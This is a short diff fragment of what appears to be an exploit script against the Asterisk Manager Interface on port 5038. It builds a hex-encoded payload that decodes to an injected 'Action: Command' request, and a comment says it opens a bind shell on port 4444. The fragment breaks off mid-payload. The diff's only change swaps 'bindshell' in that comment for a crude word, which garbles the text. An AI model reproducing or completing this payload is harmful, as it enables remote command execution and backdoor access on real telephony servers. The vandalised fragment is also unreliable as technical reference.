@@ -2,7 +2,7 @@ var target_ip = 'IP_ADDRESS';
 var target_port = '5038';
 var payload = '';
 
-// shellcode creates a bindshell on port 4444
+// shellcode creates a holyshit on port 4444
 var shellcode = "0D0A" +
 "416374696F6E3A20436F6D6D61" +
 "6E640D0A436F6D6D616E643A20222209" +
